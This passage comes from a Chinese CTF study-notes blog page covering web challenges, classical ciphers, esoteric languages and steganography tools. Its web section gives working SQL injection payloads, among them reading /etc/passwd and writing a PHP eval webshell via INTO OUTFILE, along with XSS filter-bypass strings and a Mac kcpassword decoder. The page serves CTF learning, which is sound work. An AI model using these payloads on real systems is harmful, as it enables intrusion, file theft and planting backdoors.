operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">39</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">65</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">66</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">36</span><span class="token operator">%</span><span class="token number">65</span></code></pre><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token shell-comment comment"># 通过注释符绕过</span><span class="token shell-comment comment">#</span><span class="token operator">--</span><span class="token comment">//</span><span class="token comment">/**/</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token number">00</span>select<span class="token comment">/**/</span>username<span class="token comment">/**/</span>from<span class="token comment">/**/</span>user<span class="token shell-comment comment"># URL编码绕过</span><span class="token shell-comment comment">#   空格的编码是%20，进行二次url编码进行绕过</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">--</span><span class="token operator">%</span><span class="token number">2520</span><span class="token shell-comment comment"># 空白字符绕过</span><span class="token shell-comment comment"># 数据库中一些常见的可以用来绕过空格过滤的空白符</span>SQLite3<span class="token operator">--</span><span class="token number">0</span><span class="token constant">A</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token constant">D</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token constant">C</span><span class="token punctuation">,</span><span class="token number">09</span><span class="token punctuation">,</span><span class="token number">20</span>MySql5<span class="token operator">--</span><span class="token number">09</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token constant">A</span><span class="token punctuation">.</span><span class="token number">0</span><span class="token constant">B</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token constant">C</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token constant">D</span><span class="token punctuation">,</span><span class="token number">09</span><span class="token punctuation">,</span><span class="token number">20</span>PosgresSQL<span class="token operator">--</span><span class="token number">0</span><span class="token constant">A</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token constant">D</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token constant">C</span><span class="token punctuation">,</span><span class="token number">09</span><span class="token punctuation">,</span><span class="token number">20</span>Oracle <span class="token number">11</span>g<span class="token operator">--</span><span class="token number">01</span><span class="token punctuation">,</span><span class="token number">02</span><span class="token punctuation">,</span><span class="token number">03</span><span class="token punctuation">,</span><span class="token number">04</span><span class="token punctuation">,</span><span class="token number">05</span><span class="token punctuation">,</span><span class="token number">06</span><span class="token punctuation">,</span><span class="token number">07</span><span class="token punctuation">,</span><span class="token number">08</span><span class="token punctuation">,</span><span class="token number">09</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token constant">A</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token constant">B</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token constant">C</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token constant">D</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token constant">E</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token constant">F</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token constant">A</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token constant">B</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token constant">C</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token constant">D</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token constant">E</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token constant">F</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token shell-comment comment"># 特殊符号绕过</span>select`user`<span class="token punctuation">,</span>`password`from    <span class="token shell-comment comment">#使用反引号对空格绕过，在不同场景下，(+,-,!,)也会有同样的效果</span></code></pre><h3 id="SQL读写文件"><a href="#SQL读写文件" class="headerlink" title="SQL读写文件"></a>SQL读写文件</h3><p>有些题目的flag文件并不在数据库中，需要考虑文件读取或者写入<code>shell</code>进行获取flag，在MySQL中，如果拥有file写入权限，可以使用<code>load_file</code>和<code>into outfile/dumpfile</code>进行读写操作</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select username from user where id&#x3D;$id# 构造?id&#x3D;-1+union+select+load_file(&#39;&#x2F;etc&#x2F;passwd&#39;)#在某些需要绕过单引号的情况下，可以使用文件名的十六进制作为load_file函数的参数?id&#x3D;-1+union+select+load_file(0x2f6574632f706173737764)</code></pre><p>若题目有给flag的位置或者通过其他漏洞泄露了flag文件的位置，则可以直接读取。<br>若没有给出，则可以考虑读取常见的配置文件或敏感文件，如MySQL的配置文件，Apache的配置文件，<code>.bash_history</code>等<br>写入文件的话，可以选择写入<code>Webshell</code>，计划任务等</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;-1+union+select+&#39;&lt;?php eval($_POST[007]);?&gt;&#39;+into+outfile&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;?id&#x3D;-1+union+select+unhex(0x3c3f706870206576616c28245f504f53545b3030375d293b3f3e)+into+outfile&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;shell.php&#39;</code></pre><p>需要注意写文件时确定有权限。并且写入的文件名不能为已存在文件。</p><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><p>函数报错</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1&#39;+updatexml(1,concat(0x7e,(select version),0x7e),1)%23</code></pre><h4 id="floor"><a href="#floor" class="headerlink" title="floor"></a>floor</h4><p><code>floor</code>报错原理是<code>rand</code>和<code>order by</code>或<code>group by</code>的冲突</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># 爆破数据库版本信息?id&#x3D;1&#39;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23# 爆破当前用户?id&#x3D;1&#39;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23# 爆破当前数据库?id&#x3D;1&#39;+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</code></pre><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p><code>exp()</code>报错的本质是溢出报错</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">?id&#x3D;1&#39; and exp(~(select * from (select user())x))%23</code></pre><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="截取"><a href="#截取" class="headerlink" title="截取"></a>截取</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># substr()函数是字符串截取函数，使用方法substr(str,start,length)# str为被截取的字符串,start为开始截取的位置，length为截取的长度# left()👈左截取函数left(str,length)# 从左开始截取length位# right()👉右截取函数right(str,length)# 从左开始截取length位</code></pre><h4 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql"># ascii()经常结合substr()函数使用。ascii(char)# 如果char是一串字符串，那么将返回第一个字符的ascii码ascii(substr(user(),1,1))#获取user()第一个字符的ASCII码# hex() 将字符串的值转换为十六进制的值，在ascii()函数被禁用时，或者需要将二进制数据写入文件时可以使用该函数,用法类似ascii()</code></pre><h4 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h4><pre class="language-mysql" data-language="mysql"><code class="language-mysql">if函数时盲注中常用的函数?id&#x3D;1 and 1&#x3D;if(ascii(substr(user(),1,1))&#x3D;97,1,2)%23#如果user()表第一位是&#39;a&#39;，则返回1，否则就返回2，如果返回2，那么and后的条件不成立，返回错误页面，这个时候就可以根据页面数据的长度来判断，从而达到盲注的效果</code></pre><h3 id="注入点的位置与发现"><a href="#注入点的位置与发现" class="headerlink" title="注入点的位置与发现"></a>注入点的位置与发现</h3><h4 id="常见的注入点"><a href="#常见的注入点" class="headerlink" title="常见的注入点"></a>常见的注入点</h4><pre class="language-php" data-language="php"><code class="language-php">get参数中的注入，一般最容易发现，因为在url中，可以使用sqlmap进行验证是否存在注入或者手工验证post中的注入点，一般需要抓包来发现，同样可以使用sqlmap进行验证user<span class="token operator">-</span>agent中的注入，使用burpsuite抓包，或者使用sqlmap，设置参数level<span class="token operator">=</span><span class="token number">3</span>，sqlmap就会自动检测user<span class="token operator">-</span>agent中是否存在注入cookie注入，<span class="token number">1.</span>burpsuite<span class="token number">2.</span>sqlmap设置参数为level<span class="token operator">=</span><span class="token number">2</span></code></pre><h4 id="判断注入点是否存在"><a href="#判断注入点是否存在" class="headerlink" title="判断注入点是否存在"></a>判断注入点是否存在</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token shell-comment comment"># 插入单引号</span><span class="token shell-comment comment"># 数字型通过and 1=1和闭合单引号测试语句'and'1'='1</span><span class="token shell-comment comment"># 通过数字加减判断</span><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">3</span><span class="token operator">-</span><span class="token number">1</span>如果与<span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">2</span>相同，那么证明id这个输入处可能存在<span class="token constant">SQL</span>注入</code></pre><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>XSS的题目我见得不多，所以没有将其书中的内容进行总结下来，只记录一些绕过方式吧。</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token comment">/*字符串拼接与混淆*/</span>window<span class="token punctuation">[</span><span class="token string">'alert'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*进行拼接混淆*/</span>window<span class="token punctuation">[</span><span class="token string">'al'</span><span class="token operator">+</span><span class="token string">'ert'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*或者使用JavaScript自带的base64编码解码函数来绕过*/</span>window<span class="token punctuation">[</span><span class="token function">atob</span><span class="token punctuation">(</span><span class="token string">"YWxl"</span><span class="token operator">+</span><span class="token string">"cnQ="</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*编码解码*/</span><span class="token comment">/*HTML进制编码:十进制(&amp;#97;)、十六进制(&amp;#x61;)CSS进制编码:兼容HTML中的进制表现形式JavaScript进制编码:八进制(\141)、十六进制(\x61)、Unicode编码(\u61)URL编码: %61JSfuck编码*/</span><span class="token comment">/*location.*、window.name*/</span>#敏感关键字过滤location<span class="token punctuation">.</span><span class="token operator">*</span>    <span class="token operator">?</span>input<span class="token operator">=</span><span class="token operator">&lt;</span>input onfocus<span class="token operator">=</span>outerHTML<span class="token operator">=</span><span class="token function">decodeURL</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">)</span><span class="token operator">></span>#<span class="token operator">&lt;</span>img src<span class="token operator">=</span>x onerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">></span>window<span class="token punctuation">.</span>name<span class="token operator">?</span>input<span class="token operator">=</span><span class="token operator">%</span><span class="token number">3</span>Cinput<span class="token operator">%</span><span class="token number">20</span>onfocus<span class="token operator">=</span>location<span class="token operator">=</span>window<span class="token punctuation">,</span>name<span class="token operator">%</span><span class="token number">3</span>E<span class="token string">"name="</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span>"<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span><span class="token comment">/*过滤(.)*/</span><span class="token keyword">with</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token function">alert</span><span class="token punctuation">(</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*过滤"()"*/</span>window<span class="token punctuation">,</span>onerror<span class="token operator">=</span>alert<span class="token punctuation">;</span><span class="token keyword">throw</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">/*过滤空格*/</span>#使用换行符<span class="token number">0x09</span><span class="token punctuation">,</span><span class="token number">0x19</span><span class="token punctuation">,</span><span class="token number">0x12</span><span class="token punctuation">,</span><span class="token number">0x13</span><span class="token punctuation">,</span><span class="token number">0x0a</span>等<span class="token operator">?</span>input<span class="token operator">=</span><span class="token operator">&lt;</span>img<span class="token operator">%</span><span class="token number">0</span>asrc<span class="token operator">=</span>x<span class="token operator">%</span><span class="token number">0</span>aonerror<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">></span>#在标签名称和第一个属性间也可以使用<span class="token string">"/"</span>代替空格<span class="token operator">&lt;</span>input<span class="token operator">/</span>onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token operator">></span></code></pre><h2 id="环境特性"><a href="#环境特性" class="headerlink" title="环境特性"></a>环境特性</h2><p>PHP特性就不列了</p><h3 id="Windows系统特性"><a href="#Windows系统特性" class="headerlink" title="Windows系统特性"></a>Windows系统特性</h3><ol><li>短文件名<br> 在cmd中输入<code>dir/x</code>即可看到短文件名效果。在Windows的apache环境下，可以通过短文件直接在下长文件，工具：<a href="https://github.com/lijiejie/IIS_shortname_Scanner">IIS_shortname_Scanner</a></li><li>文件上传<br> 黑名单限制后缀，可以使用Windows文件系统特性绕过，在文件名后追加高位字符<code>[\x80-0xff]</code>这样可以绕过黑名单而上传成功，且上传后的文件会去掉<code>[\x80-\xff]</code>与高位字符具有同样效果的还有<code>::$data</code><br> 还有冒号<code>:</code>，上传时后缀若改成<code>.php:.png</code>也可以上传成功，不过内容不能成功写入。<h2 id="源码泄露"><a href="#源码泄露" class="headerlink" title="源码泄露"></a>源码泄露</h2>文本备份&amp;整站源码备份<pre class="language-html" data-language="html"><code class="language-html">.index.php.swp.index.php.swoindex.php~index.php.bakindex.php.txtindex.php.oldwww/wwwdata/wwwroot/webroot/backup/dist.zip/tar/tar.gz/7z/rar/....DS_Store</code></pre>其它常见源码泄露：git泄露、svn泄露等<br>详细内容参考：<a href="https://m0re.top/posts/875fe7b5/index.html">https://m0re.top/posts/875fe7b5/index.html</a><br><code>.DS_Dtore</code>文件泄漏检测脚本：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a><br>robots.txt：做web题应当必须检测这个隐藏网页。<a href="http://www.robotstxt.org/">http://www.robotstxt.org/</a><br>爆破目录也是一种手段<br>一种不常见的信息泄露<code>.bzr</code>：    这里再分享一种源码泄露的工具：<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><pre><code>     Rip 网络可访问（分布式）版本控制系统：`SVN`、`GIT`、`Mercurial/hg`、`bzr`、...     即使关闭目录浏览，它也可以翻录存储库。     确保将自己置于要下载/克隆存储库的空目录中。</code></pre>如果给了Mac自动登录密码文件<code>/etc/kcpassword</code>，使用代码进行破解</li></ol><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">kcpasswd</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">:</span>    key <span class="token operator">=</span> <span class="token string">'7d895223d2bcddeaa3b91f'</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        key <span class="token operator">=</span> key <span class="token operator">+</span> key    key <span class="token operator">=</span> binasciiunhexlify<span class="token punctuation">(</span>key<span class="token punctuation">)</span>    result <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> result</code></pre><p>这个项目是非常不错的：<a href="https://github.com/swisskyrepo/PayloadsAllTheThings">Payload All The Things</a></p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>NodeJS参考：<a href="https://m0re.top/posts/63e48fc9/">https://m0re.top/posts/63e48fc9/</a><br>SSTI模板注入：首先尝试等泄露密钥方式，或者参考：<br>                            <a href="https://blog.nvisium.com/injecting-flask">https://blog.nvisium.com/injecting-flask</a><br>                            <a href="https://blog.nvisium.com/p263">https://blog.nvisium.com/p263</a><br>                            <a href="https://blog.nvisium.com/p255">https://blog.nvisium.com/p255</a></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><p>虽然从没做过密码学的题目，但是也看一下吧。我平时使用的一些在线网站</p><h2 id="常见的编码"><a href="#常见的编码" class="headerlink" title="常见的编码"></a>常见的编码</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#编码格式在线网站</span>hex<span class="token comment">#十六进制百度即可</span>urlencode<span class="token comment">#url编码  百度即可</span>morsecode<span class="token comment">#摩斯密码链接在下方</span>jsfuck<span class="token comment">#js代码 浏览器控制台可解</span><span class="token function">uuencode</span><span class="token comment">#很像base64编码千千秀字: http://www.qqxiuzi.cn/bianma/uuencode.php</span>base家族<span class="token comment"># 在下方</span></code></pre><p>摩斯密码：<a href="https://morsecode.scphillips.com/translator.html">https://morsecode.scphillips.com/translator.html</a><br>                    <a href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html?tdsourcetag=s_pcqq_aiomsg">Morse Code Adaptive Audio Decoder</a><br>                    <a href="https://sunpma.com/other/morse/">摩斯密码 - 在线工具</a><br>base家族：<a href="https://www.qqxiuzi.cn/bianma/base64.htm">Base64编码转换工具，Base64加密解密</a><br>                    <a href="http://ctf.ssleye.com/">CTF在线工具-CTF工具|CTF编码|CTF密码学|CTF加解密|程序员工具|在线编解码</a></p><h2 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h2><pre class="language-bash" data-language="bash"><code class="language-bash">凯撒密码/栅栏密码/维吉尼亚密码/ROT13/埃特巴什码/培根密码/猪圈密码/仿射密码/云影密码: 密文中仅包含01248五个数字，其中用0进行分割棋盘密码:密钥为5x5的棋盘希尔密码: 矩阵</code></pre><p>维吉尼亚密码：<a href="https://www.guballa.de/vigenere-solver">维吉尼亚密码爆破</a><br>                            <a href="https://cryptii.com/">https://cryptii.com/</a><br>                            正常解(已知密钥)百度搜索其他在线网站<br>内容不多，感兴趣请自行看书。附上我博客上的工具页：<a href="https://m0re.top/Tools/index.html">https://m0re.top/Tools/index.html</a></p><h2 id="脑洞大开的密码"><a href="#脑洞大开的密码" class="headerlink" title="脑洞大开的密码"></a>脑洞大开的密码</h2><p><a href="https://en.wikipedia.org/wiki/Playfair_cipher">Playfair Cipher</a>：<a href="http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html">http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html</a><br>Polybius Square：<a href="https://www.braingle.com/brainteasers/codes/polybius.php">https://www.braingle.com/brainteasers/codes/polybius.php</a><br>The Engima(英吉码)：<a href="http://enigma.louisedade.co.uk/enigma.html">http://enigma.louisedade.co.uk/enigma.html</a>, <a href="https://www.dcode.fr/enigma-machine-cipher">https://www.dcode.fr/enigma-machine-cipher</a><br>International Code of Signals Maritime(国际海事信号规则):<br><img src="https://gitee.com/m0re/picture/raw/master/img/68747470733a2f2f7777772e6d617276696e646973706c61792e636f6d2f696d616765732f5369676e616c466c6167732e676966" alt="https://www.marvindisplay.com/images/SignalFlags.gif" loading="lazy"><br><a href="https://www.dcode.fr/maritime-signals-code">https://www.dcode.fr/maritime-signals-code</a><br>匕首密码：<a href="https://www.dcode.fr/daggers-alphabet">https://www.dcode.fr/daggers-alphabet</a><br><img src="https://gitee.com/m0re/picture/raw/master/img/20210812093214.png" loading="lazy"><br>海莉安语（暮光公主)：<a href="https://www.dcode.fr/hylian-language-twilight-princess">https://www.dcode.fr/hylian-language-twilight-princess</a><br><img src="https://gitee.com/m0re/picture/raw/master/img/20210812093332.png" loading="lazy"><br>Hylian Language (Breath of the Wild):海利亚语（荒野之息）——<a href="https://www.dcode.fr/hylian-language-breath-of-the-wild">https://www.dcode.fr/hylian-language-breath-of-the-wild</a><br><img src="https://gitee.com/m0re/picture/raw/master/img/20210812093508.png" loading="lazy"><br>Sheikah Language (Breathe of the Wild):谢卡语（旷野之息）——<a href="https://www.dcode.fr/sheikah-language">https://www.dcode.fr/sheikah-language</a><br><img src="https://gitee.com/m0re/picture/raw/master/img/20210812093608.png" loading="lazy"><br>Hexahue Alphabet:六胡字母——<a href="https://www.boxentriq.com/code-breaking/hexahue">https://www.boxentriq.com/code-breaking/hexahue</a><br><img src="https://gitee.com/m0re/picture/raw/master/img/20210812093732.png" loading="lazy"><br>埃及字符<br>    一些 CTF 会尝试在带有奇怪符号的图片上隐藏消息。尝试和谷歌反向图像搜索这些。他们可能是埃及字符<br>    <img src="https://gitee.com/m0re/picture/raw/master/img/20210812105635.png" loading="lazy"><br>Base65535<br>    Unicode 字符编码。包括很多看似随机的空格和汉字！</p><pre class="language-bash" data-language="bash"><code class="language-bash">𤇃𢊻𤄻嶜𤄋𤇁𡊻𤄛𤆬𠲻𤆻𠆜𢮻𤆻ꊌ𢪻𤆻邌𤆻𤊻𤅋𤲥𣾻𤄋𥆸𣊻𤅛ꊌ𤆻𤆱炼綻𤋅𤅴薹𣪻𣊻𣽻𤇆𤚢𣺻赈𤇣綹𤻈𤇣𤾺𤇃悺𢦻𤂻𤅠㢹𣾻𤄛𤆓𤦹𤊻𤄰炜傼𤞻𢊻𣲻𣺻ꉌ邹𡊻𣹫𤅋𤇅𣾻𤇄𓎜𠚻𤊻𢊻𤉛𤅫𤂑𤃃𡉌𤵛𣹛𤁐𢉋𡉻𡡫𤇠𠞗𤇡𡊄𡒌𣼻燉𣼋𦄘炸邹㢸𠞻𠦻𡊻𣈻𡈻𣈛𡈛ꊺ𠆼𤂅𣻆𣫃𤮺𤊻𡉋㽻𣺬𣈛𡈋𤭻𤂲𣈻𤭻𤊼𢈛儛𡈛ᔺ</code></pre><p><a href="https://github.com/qntm/base65536">https://github.com/qntm/base65536</a></p><h2 id="深奥的语言"><a href="#深奥的语言" class="headerlink" title="深奥的语言"></a>深奥的语言</h2><p>一个在线网站，可以尝试多种不常见的语言：<a href="https://tio.run/#">https://tio.run/#</a><br>Brainfuck：<a href="https://copy.sh/brainfuck/">https://copy.sh/brainfuck/</a><br><a href="https://esolangs.org/wiki/COW">COW</a>：特点是只有<code>moo MOO mOO</code>等，在线网站：<a href="https://tio.run/">https://tio.run/</a></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#例子</span> MoO moO MoO mOo MOO OOM MMM moO moO MMM mOo mOo moO MMM mOo MMM moO moO MOO MOo mOo MoO moO moo mOo mOo moo</code></pre><p><a href="https://esolangs.org/wiki/malbolge">Malboge</a>：看起来很像 Base85……在线工具——<a href="http://www.malbolge.doleczek.pl/">http://www.malbolge.doleczek.pl/</a></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#例子</span><span class="token punctuation">(</span><span class="token operator">=</span><span class="token operator">&lt;</span><span class="token variable"><span class="token variable">`</span><span class="token comment">#9]~6ZY32Vx/4Rs+0No-&amp;Jk)"Fh&#125;|Bcy?</span><span class="token variable">`</span></span><span class="token operator">=</span>*z<span class="token punctuation">]</span>Kw%oG4UUS0/@-ejc<span class="token punctuation">(</span>:'8dc</code></pre><p><a href="https://esolangs.org/wiki/piet">Piet</a>：一种图形编程语言……看起来像各种颜色的大 8 位像素，在线工具：<br><img src="https://gitee.com/m0re/picture/raw/master/img/20210812094622.png" loading="lazy"><br><a href="https://esolangs.org/wiki/Rockstar">Rockstar</a>：在线网站——<a href="https://codewithrockstar.com/online">https://codewithrockstar.com/online</a></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#例子</span>Midnight takes your heart and your soulWhile your heart is as high as your soulPut your heart without your soul into your heartGive back your heartDesire is a lovestruck ladykillerMy world is nothingFire is iceHate is waterUntil my world is Desire,Build my world upIf Midnight taking my world, Fire is nothing and Midnight taking my world, Hate is nothingShout <span class="token string">"FizzBuzz!"</span>Take it to the <span class="token function">top</span>If Midnight taking my world, Fire is nothingShout <span class="token string">"Fizz!"</span>Take it to the <span class="token function">top</span>If Midnight taking my world, Hate is nothingSay <span class="token string">"Buzz!"</span>Take it to the <span class="token function">top</span>Whisper my world</code></pre><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>如果您的挑战引用“EFF”或以某种方式包含骰子，或展示长度为 5 的数字 1-6，请尝试<a href="https://www.eff.org/dice">https://www.eff.org/dice</a>。这可能是指由掷骰子生成的密码短语，此处提供：<a href="https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt">https://www.eff.org/files/2016/07/18/eff_large_wordlist.txt</a></p><h2 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h2><ul><li><p>DNA代码<br>  当给定一个只有 A、C、G、T 的序列时，有一个针对这些的在线映射<br>  <img src="https://gitee.com/m0re/picture/raw/master/img/20210812101224.png" loading="lazy"><br>  <img src="https://gitee.com/m0re/picture/raw/master/img/20210812101240.png" loading="lazy"></p></li><li><p>提取缩略图（数据覆盖在原始图像中）<br>  如果您的图像覆盖了您需要的数据，请尝试查看缩略图：</p><pre class="language-bash" data-language="bash"><code class="language-bash">exiftool -b -ThumbnailImage my_image.jpg <span class="token operator">></span> my_thumbnail.jpg</code></pre></li><li><p><a href="http://dialabc.com/sound/detect/index.html">检测 DTMF 音调</a><br>  电话按钮通用的音频频率，DTMF：<a href="https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling">https</a> : <a href="https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling">//en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling</a>。</p></li><li><p>电话键盘<br>  有些信息可能被一串数字隐藏，但实际上是用旧的手机键盘编码的，比如重复数字的短信：<br>  <img src="https://gitee.com/m0re/picture/raw/master/img/68747470733a2f2f656e637279707465642d74626e302e677374617469632e636f6d2f696d616765733f713d74626e3a414e643947635153795378486a4d4676383058577037344c5a7066726e41726f3661314d4c7165463146337a706775413550475357396f76" alt="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov" loading="lazy"></p></li><li><p>SONIC Visualizer（音频频谱）<br>  一些经典挑战使用音频文件来隐藏标志或其他敏感内容。SONIC 可视化器可以轻松地向您显示<a href="https://en.wikipedia.org/wiki/Spectrogram">频谱图</a>。<strong>如果听起来声音中有随机的哔哔声和杂音，试试这个策略！</strong></p></li><li><p><a href="https://xiao-steganography.en.softonic.com/">XIAO Steganography</a><br>  作为 Windows 特定的工具，它通常用于 CTF 以隐藏音频文件中的标志。<strong>看看挑战是否有一些可能类似于密码的奇怪字符串。</strong></p></li><li><p>Unicode 隐写术/零宽度空格字符<br>  一些可能试图以一种看似无辜的方式隐藏某些东西的文本，例如“嗯，这里可能隐藏着某些东西……”可能包含零宽度字符。这是一个可能有帮助的实用程序： <a href="https://330k.github.io/misc_tools/unicode_steganography.html">https://330k.github.io/misc_tools/unicode_steganography.html</a> …其他选项只是 Python IDLE 中的粗略查找和替换操作。</p></li><li><p>在线 LSB 工具<br>  有许多在线 LSB 工具以不同的方式工作。如果您收到一个文件，您知道它是最低有效位挑战的一部分，请尝试以下工具：<br>  <a href="https://manytools.org/hacker-tools/steganography-encode-text-into-image/">https://manytools.org/hacker-tools/steganography-encode-text-into-image/</a>仅支持 PNG <a href="https://stylesuxx.github.io/steganography/">https://stylesuxx.github.io/steganography/</a></p></li><li><p>其他隐写工具：<a href="https://github.com/DominicBreuker/stego-toolkit">https://github.com/DominicBreuker/stego-toolkit</a></p></li><li><p><a href="https://github.com/zed-0xff/zsteg"><code>zsteg</code></a>:用于对抗最低有效位隐写术的命令行工具……不幸的是，它只适用于 PNG 和 BMP 图像。</p></li><li><p><a href="https://github.com/lukechampine/jsteg"><code>jsteg</code></a>:另一个用于处理 JPEG 图像的命令行工具。<a 